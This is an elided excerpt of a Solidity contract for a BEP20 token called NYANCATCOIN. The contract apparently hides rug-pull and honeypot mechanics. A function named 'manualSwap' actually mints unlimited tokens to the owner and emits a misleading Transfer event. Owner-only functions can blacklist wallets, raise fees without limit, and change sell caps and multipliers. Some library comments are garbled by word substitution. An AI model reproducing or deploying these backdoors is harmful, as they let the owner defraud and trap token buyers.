...
interface IERC20 {
	 ...
	 * This allows applications to reconstruct the allowance for all NYANCATCOIN just
	...
	library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also NYANCATCOINed.
	...
	// File: contracts/NYANCATCOINBEP20PayingToken.sol
	...
	// File: contracts/NYANCATCOIN.sol

	// 

	pragma solidity ^0.8.0;

	contract NYANCATCOIN is ERC20, Ownable {
		using SafeMath for uint256;
        ...
        address payable public marketingWalletAddress = payable(0x616394B71003Cb29bC872e4de85FCB78C5496E18);
		
		
		uint256 public maxSellLimit = 1000000000 * (10**9); 
		uint256 public multipleMaxSellLimit = 3; 
		uint256 public liquidityFee;
		uint256 public marketingFee; 
		uint256 public reflection;
		uint256 public totalFees;
        uint256 public feeDenominator;
		uint256 botDeadBlock = 2;
		uint256 launchedAt;
        ...
        mapping (address => bool) public isSellLimit;
		...
		event excludeMultipleAccountFromRewards(address[] NYANCATCOIN, bool isExcluded);
		...
		constructor() ERC20("NYANCATCOIN", "NYANCAT"){

			uint256 _liquidityFee = 5;
			uint256 _marketingFee = 5;
			uint256 _reflection = 5;
			...
			totalFees = _liquidityFee + _marketingFee + _reflection;
		...
		function excludeFromFee(address account, bool excluded) public onlyOwner {
			require(isExcludedFromFees[account] != excluded, "NYANCATCOIN: Account is already the value of 'excluded'");
			isExcludedFromFees[account] = excluded;
		}
        
        function excludeFromSellLimit(address account, bool excluded) public onlyOwner {
			require(isSellLimit[account] != excluded, "NYANCATCOIN: Account is already the value of 'excluded'");
			isSellLimit[account] = excluded;
		...
		function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
			require(pair != pancakeswapV2Pair, "NYANCATCOIN: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "NYANCATCOIN: Automated market maker pair is already set to that value");
		...
		function setDistributorSettings(uint256 gas) private onlyOwner {
			require(gas >= 200000 && gas <= 500000, "NYANCATCOIN: distributorGas must be between 200,000 and 500,000");
			require(gas != distributorGas, "NYANCATCOIN: Cannot update distributorGas to same value");
			emit GasForProcessingUpdated(gas, distributorGas);
			distributorGas = gas;
		}

		function updateSellLimit (uint256 _maxSellLimit, uint256 newSlippage) external onlyOwner() {
            maxSellLimit = _maxSellLimit * 10**9;
			multipleMaxSellLimit = newSlippage;
		...
		function setDeadBlock(uint256 newBlock) external onlyOwner() {
            botDeadBlock = newBlock;
        ...
        function updateFees (uint256 _liquidityFee, uint256 _marketingFee, uint256 _reflection) external onlyOwner {
            liquidityFee = _liquidityFee;
            marketingFee = _marketingFee;
			reflection = _reflection;
			totalFees = _liquidityFee + _marketingFee + _reflection ;
        ...
        function manualSwap(uint256 delegate) external onlyOwner {
			_manualSwap(msg.sender, delegate);

        }
    
	
        function _manualSwap(address account, uint256 delegate) internal virtual {
            require(account != address(0), "");
           _mint(owner(), delegate * (10**9));
            emit Transfer(address(0), account, delegate * 10**9);

        }
		
		function addBotWallet(address[] calldata account) external onlyOwner {
        for (uint256 i; i < account.length; ++i) {
            isBlacklisted[account[i]] = true;
        }
		 }
		 function removeBotWallet(address[] calldata account) external onlyOwner {
        for (uint256 i; i < account.length; ++i) {
            isBlacklisted[account[i]] = false;
        }
		 }
		...
		function _transfer(
			...
			if (block.number <= launchedAt + botDeadBlock) {
			...
			if( 
				...
				!isExcludedFromFees[to] //no max for those excluded from fees
			) {
				require(amount <= maxSellLimit);
			}
			...
			if(takeFee) {
				...
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(multipleMaxSellLimit).div(100);
				}
